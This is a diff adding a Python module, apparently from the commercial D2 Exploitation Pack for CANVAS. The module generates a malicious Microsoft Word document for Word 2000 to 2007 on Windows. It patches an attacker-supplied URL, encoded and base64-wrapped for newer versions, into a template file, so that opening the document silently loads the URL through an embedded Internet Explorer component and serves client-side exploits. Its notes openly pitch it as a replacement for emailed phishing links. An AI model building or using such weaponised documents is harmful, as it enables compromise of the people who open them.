@@ -1,0 +1,148 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2009
+#
+
+
+import sys
+
+if '.' not in sys.path: 
+	sys.path.append('.')
+
+import socket
+import time
+import struct
+import base64
+import re
+
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+from shelllistener import *
+from MOSDEF import mosdef
+import canvasengine
+
+# GUI info
+NAME = "Microsoft Word file for D2 Client Insider"
+
+DESCRIPTION = "Microsoft Word file for D2 Client Insider"
+
+DOCUMENTATION = {}
+DOCUMENTATION["CVE Name"] = "Unknown"
+DOCUMENTATION["CVE Url"] = "Unknown"
+DOCUMENTATION["Notes"] = """
+With this tool you can create a Microsoft Word file which will automatically access an URL through an
+embedded Internet Explorer component. You can try to exploit almost any client side vulnerabilities
+through the opening of a simple Word file in place of an e-mail with a link. So it's perfect with
+D2 Client Insider.
+"""
+
+VERSION = "0.1"
+
+GTK2_DIALOG = "dialog.glade2"
+
+PROPERTY={}
+PROPERTY['TYPE'] = 'Exploit'
+PROPERTY['SITE'] = 'Clientside'
+PROPERTY['ARCH'] = [['Windows']]
+PROPERTY['VERSION'] = ['2000','XP']
+
+NOTES="""
+Usage:
+.\d2sec_wordclient.py -v version -O url:serverurl -O dstword:filename
+"""
+
+NOTES="""
+"""
+
+CHANGELOG="""
+"""
+
+targets = {    
+   	0: ['Microsoft Word 2000'],  
+   	1: ['Microsoft Word 2003/2007'],  	
+}  
+
+class theexploit(tcpexploit):
+    def __init__(self):
+        tcpexploit.__init__(self)
+        
+        self.version = 0
+        self.name = NAME   
+        self.url = "http://127.0.0.1:80/"
+        self.dstword = "document.doc"
+        return
+
+
+    def getArgs(self):                
+        self.url = self.argsDict.get("url", self.url)
+        self.dstword = self.argsDict.get("dstword", self.dstword)
+
+        return
+
+
+    def run(self):        
+        self.getArgs()        
+        
+        # Word 2000
+        if self.version == 0:
+        	f = open(os.getcwd() + "/3rdparty/D2SEC/exploits/d2sec_wordclient/word2000.doc", "r")
+        	buff = f.read()
+        	f.close()
+        	
+        	buff = buff.replace("MYURL", self.url)
+        	
+        # Word 2003/2007
+        else:
+        	f = open(os.getcwd() + "/3rdparty/D2SEC/exploits/d2sec_wordclient/word200x.doc", "r")
+        	buff = f.read()
+        	f.close()
+					
+        	# Encode in UNICODE
+        	encodedurl = ""
+
+        	for i in self.url:
+        		encodedurl += "\x00" + i
+
+        	# Get URL length
+        	urllen = struct.pack("B", len(self.url))
+
+        	# Format data to b64encode
+        	data = "\xAE\xFD\x24\xAE\xC6\x03\xD1\x11\x8B\x76\x00\x80\xC7\x44\xF3\x89\x00\x00" + urllen + "\x00\x00" + encodedurl + "\x00"
+
+        	# Base64 encode data
+        	encodeddata = base64.standard_b64encode(data)
+
+        	buff = buff.replace("ENCODEDDATA", encodeddata)
+
+
+      	f = open(self.dstword, "w")
+      	f.write(buff)
+      	f.close()
+        	
+        	        
+        return 1
+
+
+    def usage(self):
+        print 'Usage: %s -v version -O url:serverurl -O dstword:filename' % (sys.argv[0])
+        
+        i = 0
+        
+        print 'Available versions:'
+        
+        for listline in targets.values():
+            print '\t%d: %s'%(i, listline[0])
+            i = i + 1
+        
+        sys.exit(0) 
+
+
+if __name__=='__main__':
+    print 'This win32 local module is meant to be run only within CANVAS'
+    app = theexploit()
+    ret = standard_callback_commandline(app)
